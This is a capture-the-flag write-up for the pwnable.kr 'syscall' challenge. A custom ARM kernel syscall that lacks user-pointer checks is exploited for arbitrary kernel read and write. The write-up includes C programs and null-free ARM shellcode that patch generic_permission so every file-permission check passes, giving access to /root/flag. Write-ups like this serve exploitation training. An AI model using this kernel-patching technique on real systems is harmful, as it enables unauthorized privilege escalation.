# Syscall

Writeup for syscall challenge in pwnable.kr (200 points).

## Background
 
Syscall challenge is all about a syscall that someone added to the kernel that
we need to exploit. 

## Explore the enviroenment
When we log in with ssh to `syscall@pwnable.kr` in port 2222 
we are dropped into a VM,

`uname -a` will provide us more info about it:
```
/ $ uname -a
Linux (none) 3.11.4 #13 SMP Fri Jul 11 00:48:31 PDT 2014 armv7l GNU/Linux
```
- Architecture is `armv7l`, which is a 32 bit processor.
- Our kernel version is 3.11.4

When I logged in to this machine is was wondering how will I be able
to deliver my payload, and what flag should I read.

by running `find / -name flag` I've found the file `/root/flag`.


## Inspecting the syscall code

The given syscall is named `sys_upper` and its descriptor is 223.
What it does is very simple:
- Take 2 arguments: `char* in` and `char* out`.
- Puts transforms `in` to uppercase and stores it in `out`.

This is how it's implemented

```C
asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}
```

Complete source code is in syscall.c

### Vulnerability

The Vulnerability here is that the syscall does not use the conventional 
`copy_from_user` and `copy_to_user` functions when dealing with pointers 
from user mode.

These function ensure that the user has read/write permissions on the 
given pointers.

Since those funtions are not used, we are able to:
- **Read Kernel Memory**
- **Write Kernel Memory**


## Exploiting the vulnerability

We now have HUGE power. We can write and read from everywhere we want
in the operating system.

I assume there are many ways to pwn this machine, but I'll choose 
the one that seem the simplest to implement.

I'll try to hook a function in the kernel so it will let me read the flag.
After some research I've found the function `generic_permission`

Here is how we're going to pull this one off:

```mermaid
flowchart LR
	A[Find generic_permission address]
	B[Patch it so it will permit everything]
	C[cat /root/flag]
	A --> B --> C
```
### Overriding `generic_permission`

`generic_permission` used when reading files. When we use the read syscall from the UM, this function is called inside the kernel and checks whether the current user has the right permissions to read the desired file.

Implementation from linux kernel 3.11 source code:

```
**
 * generic_permission -  check for access rights on a Posix-like filesystem
 * @inode:	inode to check access rights for
 * @mask:	right to check for (%MAY_READ, %MAY_WRITE, %MAY_EXEC, ...)
 *
 * Used to check for read/write/execute permissions on a file.
 * We use "fsuid" for this, letting us set arbitrary permissions
 * for filesystem access without changing the "normal" uids which
 * are used for other things.
 *
 * generic_permission is rcu-walk aware. It returns -ECHILD in case an rcu-walk
 * request cannot be satisfied (eg. requires blocking or too much complexity).
 * It would then be called again in ref-walk mode.
 */
int generic_permission(struct inode *inode, int mask)
{
	// -- snip --
	// Return negative value on error, return 0 if permitted...
	// -- snip --
}
```

So if we manage to make this function return true all the time, we could just use 
`cat /root/flag` 
and it should work.


#### Finding the address
In order to find the address we could make use of `/proc/kallsyms` which is basycally the kernel's symbol table.

```
/ $ cat /proc/kallsyms | grep generic_permission
800c7d64 T generic_permission
...
```

So the address is  `0x800c7d64`, now let's patch this function!


#### Reading the function opcodes
In order to patch the function, I need to inspect its compiled code. I can get it by setting up an entire kernel with qemu like in pwnable.kr VMs, but that will be a waste of time because I actually have read/write kernel memory vulnerability. let's just read it!

Here is a C code that uses the vulnerable syscall to read the function's content:
```c
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <string.h>

#define MAX 10000

int main() {
    int counter = 0;
    int upper_syscall_descriptor = 223;
    // 800c7d64 T generic_permission
    int input = 0x800c7d64;
    char output[MAX];
    memset(output, 0, MAX);
    
    // Read content
    while (counter < 500) {
        syscall(upper_syscall_descriptor, input + counter, output);

        for (int i = 0; i < MAX && output[i] != 0; i++) {
            printf("%02x ", output[i]);
            counter++;
        }

        printf("00 ");
    }
    
}

```


now we can compile & run it on the remote machine and it will result the following:

```bash
/tmp $ ls
read.c
/tmp $ gcc -std=c99 read.c -o read
/tmp $ ./read
f8 40 2d e9 0d 20 a0 e1 7f 3d c2 e3 04 20 90 e5 3f 30 c3 e3 b0 50 d0 e1 00 f8 40 2d e9 0d 20 a0 e1 7f 3d c2 e3 04 20 90 e5 3f 30 c3 e3 b0 50 d0 e1 00 27 53 a0 01 ...
```

Now if we disassemble it with [shellstorm](https://shell-storm.org/online/Online-Assembler-and-Disassembler/) we get:
![disassembled](https://i.imgur.com/UsvJQ18.png)

As we can see, this is definately where the function starts because it pushes the registers with the following instruciton:

```
0x00000000800c7d64: F8 40 2D E9 push {r3, r4, r5, r6, r7, lr} 
0x00000000800c7d68: 0D 20 A0 E1 ...
0x00000000800c7d6c: 7F 3D C2 E3 ...
0x00000000800c7d70: 04 20 90 E5 ...
```


#### Crafting the patch
in arm assembly, function's return value is being put inside r0, so if we want this function to return zero we could just override the latter instructions with:

```
mov r0, #0
pop {r3, r4, r5, r6, r7, pc}
```

(if you are not familiar with arm assembly, just read about the lr and pc registers).

The issue with this assembly code that it assembles to blob that contains nullbytes (because both r0, and #0 are encoded to 0x00).

So get over it we can just do

```assembly
subs r2, r2
push {r2, r8}
pop {r0, r8}
pop {r3, r4, r5, r6, r7, pc}
```

which assembles to the following blob: 
```plaintext
"\x02\x20\x52\xe0\x04\x01\x2d\xe9\x01\x01\xbd\xe8\xf8\x80\xbd\xe8"
```
(compiled with [shellstorm](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=subs+r2%2C+r2%0D%0Apush+%7Br2%2C+r8%7D%0D%0Apop+%7Br0%2C+r8%7D%0D%0Apop+%7Br3%2C+r4%2C+r5%2C+r6%2C+r7%2C+pc%7D%0D%0A&arch=arm&as_format=inline#assembly) to arm)


So now let's write it to the desired address (`0x800c7d68`, one instruction after the first instruction) and see if we can read the file.

Here is C code that use our kernel memory WRITE capabiltiy to patch the kernel function.
```c
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <string.h>

#define INPUT_SIZE 1024

int main() {
    int counter = 0;
    int upper_syscall_descriptor = 223;
    int output = 0x800c7d68;
    char input[INPUT_SIZE] = "\x02\x20\x52\xe0\x04\x01\x2d\xe9\x01\x01\xbd\xe8\xf8\x80\xbd\xe8";

    syscall(upper_syscall_descriptor, input, output);
    printf("Kernel has been patched!");
    system("cat /root/flag");
}

```



## ~pwned
```
/tmp $ gcc -std=c99 patch.c -o patch
/tmp $ ./patch
Congratz!! addr_limit looks quite IMPORTANT now... huh?
Kernel has been patched!/tmp $
```


